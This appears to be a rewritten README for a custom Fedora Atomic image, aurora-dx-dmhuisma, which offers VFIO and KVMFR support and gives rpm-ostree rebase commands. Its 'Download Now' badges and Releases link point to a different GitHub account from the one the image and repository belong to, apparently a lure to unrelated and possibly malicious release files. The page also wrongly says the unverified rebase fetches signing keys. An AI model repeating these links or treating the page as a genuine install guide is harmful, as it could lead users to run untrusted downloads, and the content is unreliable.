# 🌌 aurora-dx-dmhuisma - A Simple Solution for Custom Fedora Images  

[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/kouroshkhan50/aurora-dx-dmhuisma/releases)  

Welcome to aurora-dx-dmhuisma, your straightforward way to enhance your Fedora experience. This repository focuses on rebuilding the universal Blue image, restoring vital features like VFIO support and the KVMFR kernel module.  

## 🚀 Getting Started  

Follow these steps to download and set up the software.  

### 📥 Download & Install  

1. Visit the [Releases page](https://github.com/kouroshkhan50/aurora-dx-dmhuisma/releases) to find the latest version.
2. Choose your version based on your system requirements.
3. Click on the link to download the file.

### 🔧 System Requirements  

To run this software effectively, you will need:  
- A compatible Fedora installation (Atomic or similar)  
- Adequate disk space (at least 2 GB)  
- A stable internet connection for the download and updates

### ⚙️ Installation Steps  

> **Important**  
> This feature is experimental. Use it at your own discretion.

1. **Rebase to Unsigned Image**  

   Open your terminal and run the following command to get the correct signing keys:  
   ```bash
   rpm-ostree rebase ostree-unverified-registry:ghcr.io/dmhuisma/aurora-dx-dmhuisma:latest
   ```  

2. **Reboot Your System**  

   To complete the rebase, reboot your system by entering:  
   ```bash
   systemctl reboot
   ```  

3. **Rebase to Signed Image**  

   Once your system is back up, run this command to switch to the signed image:  
   ```bash
   rpm-ostree rebase ostree-registry:ghcr.io/dmhuisma/aurora-dx-dmhuisma:latest
   ``` 

## 📝 Features  

- **VFIO Support**: This rebuild brings back support for VFIO, allowing you to run virtual machines with GPU pass-through.  
- **KVMFR Kernel Module**: Enjoy running virtual machines with 3D acceleration enabled for improved performance.  
- **Image Management**: Easily manage your custom images without the hassle of traditional setups.  

## 📚 Usage  

Using `aurora-dx-dmhuisma` is plain and simple. After installation, use your terminal to manage and configure your images. Make sure to consult the Fedora documentation for any additional commands related to image management.

## 🤝 Contributing  

We welcome contributions! If you find bugs or have suggestions for improvements, feel free to open an issue in the repository. Your input helps us ensure a better experience for everyone.

## 🛠️ Support  

If you need assistance, check the FAQ section on the Wiki or explore existing issues in the repository. For additional help, consider seeking communities online that focus on Fedora or custom operating systems.  

## 🔗 Resources  

- [GitHub Repository](https://github.com/dmhuisma/aurora-dx-dmhuisma)  
- [Fedora Project Wiki](https://www.fedoraproject.org/wiki)  

Thank you for exploring aurora-dx-dmhuisma. We hope it enhances your Fedora usage experience!  

[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/kouroshkhan50/aurora-dx-dmhuisma/releases)  